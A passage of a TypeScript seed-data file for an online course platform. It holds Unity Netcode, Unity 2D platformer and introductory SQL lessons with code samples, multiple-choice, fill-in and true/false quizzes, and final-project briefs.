      `An **RPC** (Remote Procedure Call) lets one machine trigger a method that runs on another. Netcode gives you two directions.\n\n\`\`\`csharp\npublic class PlayerShooter : NetworkBehaviour\n{\n    [ServerRpc]\n    void FireServerRpc()\n    {\n        // Runs on the server only, the server owns the truth.\n        SpawnBullet();\n        FireClientRpc();\n    }\n\n    [ClientRpc]\n    void FireClientRpc()\n    {\n        // Runs on every client, e.g. to play a muzzle-flash effect.\n        PlayMuzzleFlash();\n    }\n\n    void Update()\n    {\n        if (IsOwner && Input.GetButtonDown("Fire1"))\n            FireServerRpc();\n    }\n}\n\`\`\`\n\n## The rules\n\n- \`[ServerRpc]\` methods are called by a client (usually the owner) but always execute on the server, name them with a \`ServerRpc\` suffix.\n- \`[ClientRpc]\` methods are called by the server and execute on every connected client, suffix \`ClientRpc\`.\n- By default a \`ServerRpc\` can only be called by the object's **owner**, set \`RequireOwnership = false\` to allow any client to call it.\n- Never trust a client to decide game outcomes, a client calls a \`ServerRpc\` to *request* an action, the server validates and applies it, then tells everyone via a \`ClientRpc\`.`
    ),
    quiz: {
      title: 'RPCs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'A method marked [ServerRpc] always executes on which machine?',
          options: ["The caller's machine", 'Every client', 'The server', 'A random client'],
          answer: 'The server',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Setting RequireOwnership = false on a ServerRpc lets ____ client call it, not just the owner.',
          options: [],
          answer: 'any',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A client should be trusted to directly decide game-changing outcomes for performance reasons.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'NetworkVariables and State Synchronization',
    content: lessonContent(
      'NetworkVariables and State Synchronization',
      `RPCs are one-shot events. For continuous state, like health, score, or position, that every client should always see the current value of, use a \`NetworkVariable<T>\`.\n\n\`\`\`csharp\npublic class PlayerHealth : NetworkBehaviour\n{\n    public NetworkVariable<int> Health = new NetworkVariable<int>(\n        100,\n        NetworkVariableReadPermission.Everyone,\n        NetworkVariableWritePermission.Server\n    );\n\n    void Start()\n    {\n        Health.OnValueChanged += (oldValue, newValue) =>\n        {\n            Debug.Log($"Health changed: {oldValue} -> {newValue}");\n        };\n    }\n\n    [ServerRpc]\n    public void TakeDamageServerRpc(int amount)\n    {\n        Health.Value -= amount; // only the server may write\n    }\n}\n\`\`\`\n\n## The pieces\n\n- A \`NetworkVariable<T>\` automatically syncs its value from the server to every client, no manual RPC needed.\n- \`ReadPermission\` controls who can see it (usually \`Everyone\`), \`WritePermission\` controls who can change it (almost always \`Server\`, to prevent cheating).\n- \`OnValueChanged\` fires on every machine, server and clients, whenever the value updates, a good place to refresh UI or trigger effects.\n- Combine with coroutines when you need timed, server-authoritative changes, e.g. a coroutine on the server that ticks damage-over-time and writes to a \`NetworkVariable\` each interval.`
    ),
    quiz: {
      title: 'NetworkVariables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why should WritePermission on a NetworkVariable almost always be Server?',
          options: [
            'It runs faster that way',
            'To prevent clients from cheating by changing shared state directly',
            'Clients cannot write to variables at all',
            'It is required for compilation',
          ],
          answer: 'To prevent clients from cheating by changing shared state directly',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ event on a NetworkVariable fires on every machine when its value changes.',
          options: [],
          answer: 'OnValueChanged',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A NetworkVariable requires you to write a ClientRpc every time its value changes in order to sync it.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Networked Countdown Spawner',
    content: lessonContent(
      'Final Project: Networked Countdown Spawner',
      `Combine everything from this course into one networked feature.\n\n## Requirements\n\n1. Create a networked prefab (\`NetworkObject\` + a \`NetworkBehaviour\` script) representing an enemy spawner.\n2. On the server, run a **coroutine** that counts down from 5 seconds using \`WaitForSeconds\`, syncing the remaining time to clients through a \`NetworkVariable<float>\`.\n3. When the countdown reaches zero, the server should spawn an enemy prefab (\`Instantiate\` + \`NetworkObject.Spawn()\`) and restart the countdown.\n4. Expose a \`[ServerRpc]\` that lets any client request an immediate spawn (e.g. for testing), guarded so it only works before the match starts.\n5. Use a \`[ClientRpc]\` to play a sound or log a message on every client the moment an enemy spawns.\n\n## Stretch goals\n\n- Cap the number of enemies alive at once, checked server-side before spawning.\n- Show the synced countdown in on-screen UI using \`NetworkVariable.OnValueChanged\`.\n- Handle a client that joins mid-countdown, it should immediately see the current value, not start from zero.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const unityPlatformerLessons: SeedLesson[] = [
  {
    title: 'Project Setup & the Player Controller',
    content: lessonContent(
      'Project Setup & the Player Controller',
      `A platformer starts with the one thing every level depends on: a player that can move and jump reliably. In 2D Unity, that means \`Rigidbody2D\` and a **ground check**.\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class PlayerController : MonoBehaviour\n{\n    public float moveSpeed = 6f;\n    public float jumpForce = 12f;\n    public Transform groundCheck;\n    public LayerMask groundLayer;\n\n    Rigidbody2D rb;\n    bool isGrounded;\n\n    void Awake()\n    {\n        rb = GetComponent<Rigidbody2D>();\n    }\n\n    void Update()\n    {\n        isGrounded = Physics2D.OverlapCircle(groundCheck.position, 0.2f, groundLayer);\n\n        float move = Input.GetAxisRaw("Horizontal");\n        rb.linearVelocity = new Vector2(move * moveSpeed, rb.linearVelocity.y);\n\n        if (isGrounded && Input.GetButtonDown("Jump"))\n        {\n            rb.linearVelocity = new Vector2(rb.linearVelocity.x, jumpForce);\n        }\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`Rigidbody2D\` (not the 3D \`Rigidbody\`) handles gravity and movement for 2D games, set its **Body Type** to \`Dynamic\` in the Inspector.\n- \`Physics2D.OverlapCircle(point, radius, layerMask)\` checks whether any collider on \`groundLayer\` overlaps a small circle, a cheap, reliable way to ask "is the player standing on something?" without relying on fragile collision-event timing.\n- \`groundCheck\` is an empty child GameObject positioned at the player's feet, purely there to give the overlap circle a position to check from.\n- \`Input.GetAxisRaw\` (unlike \`GetAxis\`) returns exactly -1, 0, or 1 with no smoothing, snappier and more predictable for platformer movement.\n- Only jump when \`isGrounded\` is true, otherwise the player could jump endlessly in mid-air.\n\n> [!TIP]\n> Put ground and platform tiles on their own **Layer** (e.g. "Ground"), and set \`groundLayer\` to only that layer in the Inspector. Otherwise \`OverlapCircle\` might count the player's own collider or an enemy standing nearby as "ground."`
    ),
    quiz: {
      title: 'Player Controller Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does Physics2D.OverlapCircle check for in the ground-check pattern?',
          options: [
            'Whether the player is moving',
            'Whether any collider on a given layer overlaps a point',
            "The player's current health",
            "The camera's position",
          ],
          answer: 'Whether any collider on a given layer overlaps a point',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Input.Get____("Horizontal") returns an unsmoothed -1, 0, or 1, better suited to snappy platformer movement than GetAxis.',
          options: [],
          answer: 'AxisRaw',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The player should be able to jump whether or not isGrounded is true.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Tilemaps and Level Design',
    content: lessonContent(
      'Tilemaps and Level Design',
      `Hand-placing hundreds of individual sprite GameObjects for a level doesn't scale. Unity's **Tilemap** system lets you paint a level like a grid-based canvas instead.\n\n## Setting up a Tilemap\n\n1. Right-click in the Hierarchy → **2D Object → Tilemap → Rectangular**, this creates a \`Grid\` GameObject with a \`Tilemap\` child.\n2. Open the **Tile Palette** window (Window → 2D → Tile Palette), create a new palette, and drag your tile sprites into it.\n3. Select the paint brush tool and click on the Tilemap in the Scene view to place tiles.\n\n## Making the tiles solid\n\nOn the Tilemap GameObject, add a \`Tilemap Collider2D\` and a \`Rigidbody2D\` set to Body Type \`Static\`. A \`TilemapCollider2D\` automatically generates a collider shape from whatever tiles are painted, so painting a new platform is enough, no manual collider work needed.\n\n## Reading tile data from code\n\n\`\`\`csharp\nusing UnityEngine;\nusing UnityEngine.Tilemaps;\n\npublic class LevelInfo : MonoBehaviour\n{\n    public Tilemap tilemap;\n\n    public bool IsSolidAt(Vector3 worldPosition)\n    {\n        Vector3Int cell = tilemap.WorldToCell(worldPosition);\n        return tilemap.HasTile(cell);\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`Grid\` defines the cell size and layout that every child \`Tilemap\` shares, a level can have several Tilemaps (ground, background decoration, hazards) stacked on the same Grid.\n- A Tilemap's \`Rigidbody2D\` should be \`Static\`, the level geometry doesn't move.\n- \`WorldToCell\` converts a world-space position (like a GameObject's \`transform.position\`) into the Tilemap's grid coordinates, useful for gameplay logic that needs to know "what tile is under this point."\n\n> [!TIP]\n> Keep hazards (spikes, lava) on a **separate Tilemap** from solid ground, with its own collider set to **Is Trigger**. That way a single \`OnTriggerEnter2D\` check on the player can detect "touched a hazard" without it also being solid ground.`
    ),
    quiz: {
      title: 'Tilemaps Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which component automatically generates a collider shape that matches the tiles painted on a Tilemap?',
          options: ['Rigidbody2D', 'TilemapCollider2D', 'BoxCollider2D', 'TileRenderer'],
          answer: 'TilemapCollider2D',
        },
        {
          type: 'FILL_BLANK',
          prompt: "A Tilemap's Rigidbody2D should be set to Body Type ____, since level geometry doesn't move.",
          options: [],
          answer: 'Static',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A single Grid GameObject can have multiple Tilemap children, e.g. one for ground and one for background decoration.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Camera Follow and Bounds',
    content: lessonContent(
      'Camera Follow and Bounds',
      `A platformer camera needs to track the player smoothly, without jittering or showing empty space past the edges of the level.\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class CameraFollow : MonoBehaviour\n{\n    public Transform target;\n    public float smoothTime = 0.15f;\n    public Vector2 minBounds;\n    public Vector2 maxBounds;\n\n    Vector3 velocity;\n\n    void LateUpdate()\n    {\n        Vector3 desired = new Vector3(target.position.x, target.position.y, transform.position.z);\n        Vector3 smoothed = Vector3.SmoothDamp(transform.position, desired, ref velocity, smoothTime);\n\n        smoothed.x = Mathf.Clamp(smoothed.x, minBounds.x, maxBounds.x);\n        smoothed.y = Mathf.Clamp(smoothed.y, minBounds.y, maxBounds.y);\n\n        transform.position = smoothed;\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`LateUpdate()\` runs after every \`Update()\` this frame, cameras should always follow in \`LateUpdate\`, so they track the player's **final** position for the frame instead of a stale one from before its last movement.\n- \`Vector3.SmoothDamp\` eases the camera toward a target position over \`smoothTime\` seconds, instead of snapping instantly, this is what makes camera movement feel smooth rather than jittery. It needs a \`ref Vector3 velocity\` field that it updates internally between calls, don't reset that field yourself.\n- \`Mathf.Clamp\` on the final x and y keeps the camera from ever showing area outside \`minBounds\`/\`maxBounds\`, set those to the edges of your level so the camera stops panning once it reaches them.\n- The camera's own \`z\` position is preserved (\`transform.position.z\`) rather than copied from the player, since the player lives on the 2D gameplay plane but the camera needs distance from it to actually render anything.\n\n> [!TIP]\n> Unity's **Cinemachine** package does all of this (smoothing, bounds via a Confiner) with no code and far more polish, writing your own follow script first is worth doing once so you understand what Cinemachine is actually doing under the hood.`
    ),
    quiz: {
      title: 'Camera Follow Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why should camera-follow logic run in LateUpdate instead of Update?',
          options: [
            'LateUpdate runs faster',
            "It ensures the camera tracks the player's final position for the frame",
            'Update cannot read Transform values',
            'LateUpdate is required for Rigidbody2D',
          ],
          answer: "It ensures the camera tracks the player's final position for the frame",
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Vector3.____ eases a value toward a target over time instead of snapping to it instantly.',
          options: [],
          answer: 'SmoothDamp',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Mathf.Clamp on the camera's position can prevent it from showing area outside the level bounds.",
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Animator: Idle, Run, and Jump Animations',
    content: lessonContent(
      'Animator: Idle, Run, and Jump Animations',
      `A static sprite makes movement look robotic. Unity's **Animator** system swaps between animation clips based on parameters your code sets every frame.\n\n## Setting up the Animator Controller\n\n1. Create an **Animator Controller** asset, and add three states: \`Idle\`, \`Run\`, \`Jump\`.\n2. Add parameters: a \`float Speed\` and a \`bool IsGrounded\`.\n3. Draw transitions: \`Idle → Run\` when \`Speed > 0.1\`, \`Run → Idle\` when \`Speed <= 0.1\`, and both \`→ Jump\` when \`IsGrounded\` becomes \`false\`.\n4. Assign the Animator Controller to the player's \`Animator\` component.\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class PlayerAnimation : MonoBehaviour\n{\n    Animator animator;\n    Rigidbody2D rb;\n    SpriteRenderer spriteRenderer;\n\n    void Awake()\n    {\n        animator = GetComponent<Animator>();\n        rb = GetComponent<Rigidbody2D>();\n        spriteRenderer = GetComponent<SpriteRenderer>();\n    }\n\n    void Update()\n    {\n        float speed = Mathf.Abs(rb.linearVelocity.x);\n        animator.SetFloat("Speed", speed);\n        animator.SetBool("IsGrounded", Mathf.Abs(rb.linearVelocity.y) < 0.01f);\n\n        if (rb.linearVelocity.x != 0f)\n        {\n            spriteRenderer.flipX = rb.linearVelocity.x < 0f;\n        }\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`animator.SetFloat(...)\`/\`SetBool(...)\` push values from code into the Animator Controller's parameters every frame, the transitions you drew in the editor react to those values automatically, your code never has to say "play the Run animation" directly.\n- Keeping animation logic in its own \`PlayerAnimation\` script, separate from \`PlayerController\`'s movement logic, means either one can change without touching the other.\n- \`spriteRenderer.flipX\` mirrors the sprite horizontally, a cheap way to make one "Run" animation face both left and right instead of needing separate clips.\n\n> [!WARNING]\n> If a transition's conditions can never actually be reached (e.g. checking \`Speed > 0.1\` but the code only ever sets whole numbers), the Animator gets stuck in one state. Use the Animator window's live preview during Play mode to watch which state is active and debug transitions.`
    ),
    quiz: {
      title: 'Animator Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How does code trigger an Animator transition, like Idle to Run?',
          options: [
            'By calling animator.Play("Run") every frame',
            'By setting parameters (like a float or bool) that the transition conditions check',
            'Transitions are fully automatic and need no code',
            'By destroying and re-instantiating the Animator',
          ],
          answer: 'By setting parameters (like a float or bool) that the transition conditions check',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'spriteRenderer.____ mirrors a sprite horizontally, useful for reusing one animation for both facing directions.',
          options: [],
          answer: 'flipX',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Animation logic and movement logic must always live in the same script.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Collectibles and Enemies',
    content: lessonContent(
      'Collectibles and Enemies',
      `A platformer needs something to collect and something to avoid. Both come from the trigger and collision patterns you already know, applied to specific gameplay roles.\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class Coin : MonoBehaviour\n{\n    public int value = 10;\n\n    void OnTriggerEnter2D(Collider2D other)\n    {\n        if (!other.CompareTag("Player")) return;\n\n        GameManager.Instance.AddScore(value);\n        Destroy(gameObject);\n    }\n}\n\`\`\`\n\n\`\`\`csharp\nusing UnityEngine;\n\npublic class Patroller : MonoBehaviour\n{\n    public float speed = 2f;\n    public float patrolDistance = 3f;\n\n    Vector3 start;\n    int direction = 1;\n\n    void Start()\n    {\n        start = transform.position;\n    }\n\n    void Update()\n    {\n        transform.Translate(Vector2.right * direction * speed * Time.deltaTime);\n\n        if (Mathf.Abs(transform.position.x - start.x) >= patrolDistance)\n        {\n            direction *= -1;\n            transform.localScale = new Vector3(-transform.localScale.x, transform.localScale.y, 1f);\n        }\n    }\n\n    void OnCollisionEnter2D(Collision2D collision)\n    {\n        if (collision.gameObject.CompareTag("Player"))\n        {\n            collision.gameObject.GetComponent<PlayerHealth>()?.TakeDamage(1);\n        }\n    }\n}\n\`\`\`\n\n## The pieces\n\n- A coin's collider is a **trigger** (\`Is Trigger\` checked), so the player passes through it while still getting \`OnTriggerEnter2D\`, and it destroys itself once collected.\n- The patroller walks back and forth by tracking distance from its \`start\` position, and flips its \`direction\` (and its sprite, via \`localScale.x\`) at each end.\n- \`OnCollisionEnter2D\` on the enemy fires when the player touches its **solid** collider, that's the difference from the coin: an enemy should physically be there (block/push the player), a coin shouldn't.\n- \`GetComponent<PlayerHealth>()?.TakeDamage(1)\` uses the null-conditional \`?.\` in case the colliding object somehow doesn't have a \`PlayerHealth\` component, avoiding a crash.\n\n> [!TIP]\n> Give enemies and hazards a distinct **Tag** (e.g. "Enemy", "Hazard") and coins a "Collectible" tag. Tag checks (\`CompareTag\`) are far cheaper than \`GetComponent\` calls just to identify what something is.`
    ),
    quiz: {
      title: 'Collectibles & Enemies Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Why is a coin's collider set to Is Trigger instead of a solid collider?",
          options: [
            'Triggers are faster to render',
            'So the player can pass through it while still detecting the overlap',
            'Trigger colliders cannot be destroyed',
            'It is required for 2D sprites',
          ],
          answer: 'So the player can pass through it while still detecting the overlap',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'CompareTag(...) is a cheaper way to check what a GameObject is than calling ____ just to check if a component exists.',
          options: [],
          answer: 'GetComponent',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An enemy that should physically block the player should use a trigger collider instead of a solid one.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'UI: Score, Health, and Level Complete',
    content: lessonContent(
      'UI: Score, Health, and Level Complete',
      `Wire the systems from earlier lessons to a UI a player can actually see, using a small manager class that everything else talks to.\n\n\`\`\`csharp\nusing UnityEngine;\nusing TMPro;\n\npublic class GameManager : MonoBehaviour\n{\n    public static GameManager Instance { get; private set; }\n\n    public TMP_Text scoreText;\n    public GameObject levelCompletePanel;\n\n    int score;\n\n    void Awake()\n    {\n        Instance = this;\n    }\n\n    public void AddScore(int amount)\n    {\n        score += amount;\n        scoreText.text = $"Score: {score}";\n    }\n\n    public void CompleteLevel()\n    {\n        levelCompletePanel.SetActive(true);\n        Time.timeScale = 0f;\n    }\n}\n\`\`\`\n\n## The pieces\n\n- \`public static GameManager Instance { get; private set; }\` is a lightweight **singleton**: any script can reach the one \`GameManager\` in the scene with \`GameManager.Instance\`, instead of every script needing a manually-dragged reference. That's how \`Coin\` called \`GameManager.Instance.AddScore(...)\` in the previous lesson.\n- \`scoreText.text = $"Score: {score}"\` is the same pattern from the Unity Essentials course, code pushes new values into the UI, the UI never updates itself.\n- \`levelCompletePanel\` is a \`Canvas\` child (a panel with a background and text) that starts inactive in the Inspector and gets \`SetActive(true)\` only when the level is finished.\n- \`Time.timeScale = 0f\` pauses all physics and any code using \`Time.deltaTime\` (like the patroller's movement), a simple way to freeze gameplay behind a completion or pause screen without disabling every script individually.\n\n> [!WARNING]\n> Setting \`Time.timeScale = 0f\` also freezes \`Update()\`-based countdowns and animations driven by \`deltaTime\`. Resetting it back to \`1f\` (e.g. when restarting the level) is easy to forget, and leaves the whole game frozen.`
    ),
    quiz: {
      title: 'UI & Game State Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the GameManager.Instance pattern let other scripts do?',
          options: [
            'Create a new GameManager each time',
            'Reach the one GameManager in the scene without a manually-dragged reference',
            'Automatically destroy themselves',
            'Skip using the Inspector entirely for all fields',
          ],
          answer: 'Reach the one GameManager in the scene without a manually-dragged reference',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Setting Time.____ to 0 pauses physics and any code driven by deltaTime, useful for a level-complete or pause screen.',
          options: [],
          answer: 'timeScale',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'UI text updates itself automatically whenever the underlying score variable changes.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Finish Your Platformer',
    content: lessonContent(
      'Final Project: Finish Your Platformer',
      `You now have every piece: a responsive player controller, a tile-based level, a camera that follows smoothly, animated movement, collectibles and enemies, and a UI wired to game state. Put it all together into one complete, playable level.\n\n## Requirements\n\n1. Combine the \`PlayerController\`, \`PlayerAnimation\`, and \`CameraFollow\` scripts from earlier lessons onto a player that can run, jump, and be tracked by the camera across a full level.\n2. Build a level with a Tilemap, including solid ground and at least one gap the player must jump across.\n3. Place at least 5 coins (using the \`Coin\` script) and update the score UI live as they're collected.\n4. Add at least one patrolling enemy that damages the player on contact, and a \`PlayerHealth\` script that ends the run (e.g. reloads the level) when health reaches 0.\n5. Show the level-complete panel when the player reaches an end-of-level trigger zone, and pause gameplay while it's shown.\n\n## Stretch goals\n\n- Add a second enemy type that doesn't patrol, but instead activates and chases the player once it enters an \`OnTriggerEnter2D\` "aggro" radius.\n- Add a simple checkpoint system: touching a checkpoint updates where the player respawns after taking too much damage, instead of always restarting from the beginning.\n- Swap your hand-written \`CameraFollow\` for Unity's **Cinemachine** package, and compare how much of your script it replaces.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const sqlLessons: SeedLesson[] = [
  {
    title: 'Introduction to SQL and SELECT',
    content: lessonContent(
      'Introduction to SQL and SELECT',
      `SQL (Structured Query Language) is how you talk to a **relational database**, data organized into tables made of rows and columns. Almost every application with a database uses SQL under the hood.\n\nImagine a \`students\` table:\n\n| id | name | xp |\n|----|------|-----|\n| 1 | Ada | 120 |\n| 2 | Grace | 95 |\n| 3 | Alan | 60 |\n\n## Selecting data\n\n\`\`\`sql\nSELECT name, xp\nFROM students;\n\nSELECT *\nFROM students;\n\`\`\`\n\n- \`SELECT\` lists the columns you want back, or \`*\` for every column.\n- \`FROM\` says which table to read from.\n- Every statement ends with a semicolon \`;\`.\n\n> [!NOTE]\n> SQL keywords like \`SELECT\` and \`FROM\` aren't case-sensitive (\`select\` works too), but writing them in \`UPPERCASE\` is the near-universal convention, it makes queries easier to scan.`
    ),
    quiz: {
      title: 'SQL Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does SQL stand for?',
          options: ['Structured Query Language', 'Sequential Query Logic', 'System Query Layer', 'Structured Question Language'],
          answer: 'Structured Query Language',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The ____ clause specifies which table a query reads from.',
          options: [],
          answer: 'FROM',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'SQL keywords like SELECT and FROM are not case-sensitive.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Filtering with WHERE',
    content: lessonContent(
      'Filtering with WHERE',
      `\`\`\`sql\nSELECT name, xp\nFROM students\nWHERE xp >= 100;\n\nSELECT name\nFROM students\nWHERE name LIKE 'A%';\n\`\`\`\n\n## Comparisons and patterns\n\n- \`WHERE\` filters rows before they're returned, only rows where the condition is true make it into the result.\n- \`LIKE 'A%'\` matches names starting with \`A\`, \`%\` is a wildcard for "anything, any length".\n- Combine conditions with \`AND\` / \`OR\`, and control the result order with \`ORDER BY\`:\n\n\`\`\`sql\nSELECT name, xp\nFROM students\nWHERE xp >= 50 AND name != 'Ada'\nORDER BY xp DESC;\n\`\`\`\n\n\`ORDER BY xp DESC\` sorts highest-XP first, drop \`DESC\` (or use \`ASC\`) to sort lowest first.`
    ),
    quiz: {
      title: 'WHERE Clause Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which keyword matches a text pattern like a prefix or suffix?',
          options: ['MATCH', 'LIKE', 'HAS', 'IN'],
          answer: 'LIKE',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To sort query results from highest to lowest, you add ORDER BY column ____.',
          options: [],
          answer: 'DESC',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The WHERE clause filters rows before they are included in the result set.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Joining Tables',
    content: lessonContent(
      'Joining Tables',
      `Relational databases spread data across multiple tables, a \`JOIN\` combines rows from two tables based on a shared column.\n\nGiven \`students(id, name)\` and \`enrollments(student_id, course_title)\`:\n\n\`\`\`sql\nSELECT students.name, enrollments.course_title\nFROM students\nJOIN enrollments ON students.id = enrollments.student_id;\n\`\`\`\n\n\`ON students.id = enrollments.student_id\` tells the database how to match rows between the two tables.\n\n## INNER JOIN vs. LEFT JOIN\n\n- A plain \`JOIN\` (short for \`INNER JOIN\`) only returns rows that have a match in **both** tables.\n- A \`LEFT JOIN\` keeps every row from the left (first) table, filling in \`NULL\` for columns from the right table when there's no match, useful for finding students with **zero** enrollments.\n\n\`\`\`sql\nSELECT students.name, enrollments.course_title\nFROM students\nLEFT JOIN enrollments ON students.id = enrollments.student_id;\n\`\`\``
    ),
    quiz: {
      title: 'Joins Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does a JOIN need in order to combine rows from two tables?',
          options: ['A shared, matching column', 'Identical column names everywhere', 'The same number of rows in each table', 'Nothing extra'],
          answer: 'A shared, matching column',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ JOIN keeps every row from the left table even when there is no match, filling in NULLs.',
          options: [],
          answer: 'LEFT',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An INNER JOIN only returns rows that have a match in both tables.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Aggregating with GROUP BY',
    content: lessonContent(
      'Aggregating with GROUP BY',
      `**Aggregate functions** summarize many rows into one value, \`COUNT\`, \`SUM\`, \`AVG\`, \`MIN\`, \`MAX\`. \`GROUP BY\` buckets rows before aggregating.\n\n\`\`\`sql\nSELECT course_title, COUNT(*) AS student_count\nFROM enrollments\nGROUP BY course_title;\n\`\`\`\n\nThis counts how many enrollment rows exist per \`course_title\`, one summary row per group.\n\n## Filtering groups with HAVING\n\n\`WHERE\` filters individual rows **before** grouping, \`HAVING\` filters the grouped results **after** aggregating:\n\n\`\`\`sql\nSELECT course_title, AVG(xp) AS average_xp\nFROM enrollments\nJOIN students ON students.id = enrollments.student_id\nGROUP BY course_title\nHAVING AVG(xp) > 50;\n\`\`\`\n\nYou can't write \`WHERE AVG(xp) > 50\`, the average doesn't exist yet at the point \`WHERE\` runs, that's exactly what \`HAVING\` is for.`
    ),
    quiz: {
      title: 'Aggregation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which clause filters groups after aggregation, where WHERE cannot be used?',
          options: ['WHERE', 'HAVING', 'FILTER', 'GROUP'],
          answer: 'HAVING',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'COUNT(*) counts the number of ____ in each group.',
          options: [],
          answer: 'rows',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'You can filter on an aggregate result like COUNT(*) using a plain WHERE clause.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Modifying Data: INSERT, UPDATE, DELETE',
    content: lessonContent(
      'Modifying Data: INSERT, UPDATE, DELETE',
      `So far every example has only read data. These three statements change it.\n\n\`\`\`sql\nINSERT INTO students (name, xp)\nVALUES ('Grace', 0);\n\nUPDATE students\nSET xp = xp + 25\nWHERE name = 'Grace';\n\nDELETE FROM students\nWHERE xp = 0 AND name = 'Inactive User';\n\`\`\`\n\n- \`INSERT INTO table (columns) VALUES (...)\` adds a new row.\n- \`UPDATE table SET column = value WHERE ...\` modifies existing rows that match the condition.\n- \`DELETE FROM table WHERE ...\` removes matching rows.\n\n> [!WARNING]\n> \`UPDATE\` and \`DELETE\` without a \`WHERE\` clause apply to **every row in the table**. Forgetting the \`WHERE\` is one of the most common, and most costly, mistakes in SQL, always double-check it before running either statement.`
    ),
    quiz: {
      title: 'Modifying Data Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which statement adds a brand-new row to a table?',
          options: ['UPDATE', 'INSERT', 'CREATE', 'ADD'],
          answer: 'INSERT',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Running UPDATE students SET xp = 0 without a ____ clause would reset every row.',
          options: [],
          answer: 'WHERE',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Forgetting the WHERE clause on an UPDATE or DELETE is a common and costly mistake.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Query a Mini Course Catalog',
    content: lessonContent(
      'Final Project: Query a Mini Course Catalog',
